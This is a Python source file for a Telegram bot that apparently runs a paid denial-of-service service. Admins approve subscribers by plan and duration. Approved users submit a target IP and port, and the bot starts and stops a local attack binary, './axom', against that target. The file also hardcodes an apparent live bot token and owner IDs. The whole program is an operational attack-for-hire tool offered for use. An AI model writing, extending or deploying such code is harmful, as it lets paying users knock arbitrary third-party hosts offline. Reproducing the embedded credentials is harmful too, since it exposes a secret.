import telebot
import logging
import subprocess
import json
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

TOKEN = '7538286236:AAFWMsdz8OMWcohzafVX0pAGxWYTp31qQa4'
CHANNEL_ID = -1002177435859
ADMIN_IDS = [5568478295]  # List of admin IDs

bot = telebot.TeleBot(TOKEN)
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
user_attack_details = {}
active_attacks = {}

# Define the file path for user data
USER_DATA_FILE = "users_data.json"

# Function to load user data from the file
def load_user_data():
    try:
        with open(USER_DATA_FILE, 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

# Function to save user data to the file
def save_user_data(data):
    with open(USER_DATA_FILE, 'w') as file:
        json.dump(data, file, indent=4)

# Load initial user data
user_data = load_user_data()

OWNER_ID = 5568478295  # Replace with your actual Telegram user ID
OWNER_NAME = "ANKUR"  # Replace with your actual name

# Function to run the attack command synchronously
def run_attack_command_sync(user_id, target_ip, target_port, action):
    try:
        if action == 1:
            process = subprocess.Popen(["./axom", target_ip, str(target_port), "1", "100"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            active_attacks[user_id] = process.pid
            logging.info(f"Started attack: PID {process.pid} for User {user_id} on {target_ip}:{target_port}")
        elif action == 2:
            pid = active_attacks.pop(user_id, None)
            if pid:
                subprocess.run(["kill", str(pid)], check=True)
                logging.info(f"Stopped attack: PID {pid} for User {user_id} on {target_ip}:{target_port}")
    except Exception as e:
        logging.error(f"Error in run_attack_command_sync: {e}")

# Check if the user is an admin
def is_user_admin(user_id):
    return user_id in ADMIN_IDS

# Check if the user is approved to attack
def check_user_approval(user_id):
    try:
        user_info = user_data.get(str(user_id))
        if user_info and user_info['plan'] > 0:
            valid_until = user_info.get('valid_until', "")
            return valid_until == "" or datetime.now().date() <= datetime.fromisoformat(valid_until).date()
        return False
    except Exception as e:
        logging.error(f"Error in checking user approval: {e}")
        return False

# Approve a user
def approve_user(user_id, plan, days):
    try:
        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else ""
        user_data[str(user_id)] = {
            "plan": plan,
            "valid_until": valid_until,
            "access_count": 0
        }
        save_user_data(user_data)
        return True
    except Exception as e:
        logging.error(f"Error approving user: {e}")
        return False

# Disapprove a user
def disapprove_user(user_id):
    try:
        user_data.pop(str(user_id), None)
        save_user_data(user_data)
    except Exception as e:
        logging.error(f"Error in disapproving user: {e}")

# Send not approved message
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')

# Send main action buttons
def send_main_buttons(chat_id):
    markup = ReplyKeyboardMarkup(row_width=3, resize_keyboard=True, one_time_keyboard=True)
    markup.add(KeyboardButton("Attack"), KeyboardButton("Start Attack"), KeyboardButton("Stop Attack"))
    bot.send_message(chat_id, "*Choose an action:*", reply_markup=markup, parse_mode='Markdown')

# Approve user command
@bot.message_handler(commands=['approve'])
def approve_user_handler(message):
    if not is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    try:
        cmd_parts = message.text.split()
        if len(cmd_parts) != 4:
            bot.send_message(message.chat.id, "*Invalid command format. Use /approve <user_id> <plan> <days>*", parse_mode='Markdown')
            return

        target_user_id = int(cmd_parts[1])
        plan = int(cmd_parts[2])
        days = int(cmd_parts[3])

        if approve_user(target_user_id, plan, days):
            bot.send_message(message.chat.id, f"*User {target_user_id} approved with plan {plan} for {days} days.*", parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "*Failed to approve user.*", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(message.chat.id, "*Failed to approve user.*", parse_mode='Markdown')
        logging.error(f"Error in approving user: {e}")

# Disapprove user command
@bot.message_handler(commands=['disapprove'])
def disapprove_user_handler(message):
    if not is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    try:
        cmd_parts = message.text.split()
        if len(cmd_parts) != 2:
            bot.send_message(message.chat.id, "*Invalid command format. Use /disapprove <user_id>*", parse_mode='Markdown')
            return

        target_user_id = int(cmd_parts[1])
        disapprove_user(target_user_id)
        bot.send_message(message.chat.id, f"*User {target_user_id} disapproved and removed from the list.*", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(message.chat.id, "*Failed to disapprove user.*", parse_mode='Markdown')
        logging.error(f"Error in disapproving user: {e}")

# Handle attack button
@bot.message_handler(func=lambda message: message.text == "Attack")
def handle_attack_button(message):
    if not check_user_approval(message.from_user.id):
        send_not_approved_message(message.chat.id)
        return

    bot.send_message(message.chat.id, "*Please provide the target IP and port separated by a space.*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_ip_port)

# Process attack IP and port
def process_attack_ip_port(message):
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.send_message(message.chat.id, "*Invalid format. Provide both target IP and port.*", parse_mode='Markdown')
            return

        target_ip, target_port = args[0], int(args[1])
        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Use another port.*", parse_mode='Markdown')
            return

        user_attack_details[message.from_user.id] = (target_ip, target_port)
        send_main_buttons(message.chat.id)
    except Exception as e:
        bot.send_message(message.chat.id, "*Failed to process attack IP and port.*", parse_mode='Markdown')
        logging.error(f"Error in processing attack IP and port: {e}")

# Start attack command
@bot.message_handler(func=lambda message: message.text == "Start Attack")
def start_attack(message):
    # Check if there is an active attack for the user
    if message.from_user.id in active_attacks:
        bot.send_message(message.chat.id, "*An attack is already running. Stop the current attack before starting a new one.*", parse_mode='Markdown')
        return

    attack_details = user_attack_details.get(message.from_user.id)
    if attack_details:
        target_ip, target_port = attack_details
        run_attack_command_sync(message.from_user.id, target_ip, target_port, 1)
        bot.send_message(message.chat.id, f"*Attack started on Host: {target_ip} Port: {target_port}*", parse_mode='Markdown')
    else:
        bot.send_message(message.chat.id, "*No target specified. Use the Attack button to set it up.*", parse_mode='Markdown')

# Stop attack command
@bot.message_handler(func=lambda message: message.text == "Stop Attack")
def stop_attack(message):
    attack_details = user_attack_details.get(message.from_user.id)
    if attack_details:
        target_ip, target_port = attack_details
        run_attack_command_sync(message.from_user.id, target_ip, target_port, 2)
        bot.send_message(message.chat.id, f"*Attack stopped on Host: {target_ip} Port: {target_port}*", parse_mode='Markdown')
        user_attack_details.pop(message.from_user.id, None)
    else:
        bot.send_message(message.chat.id, "*No active attack found to stop.*", parse_mode='Markdown')

# Start command to show action buttons
@bot.message_handler(commands=['start'])
def start_command(message):
    send_main_buttons(message.chat.id)

# Owner info command
@bot.message_handler(commands=['owner'])
def owner_info(message):
    if message.from_user.id == OWNER_ID:
        bot.send_message(message.chat.id, f"*I am the owner of this bot: {OWNER_NAME}*", parse_mode='Markdown')
    else:
        bot.send_message(message.chat.id, "*You are not authorized to view owner information.*", parse_mode='Markdown')

if __name__ == "__main__":
    logging.info("Starting bot...")
    bot.polling(none_stop=True)
    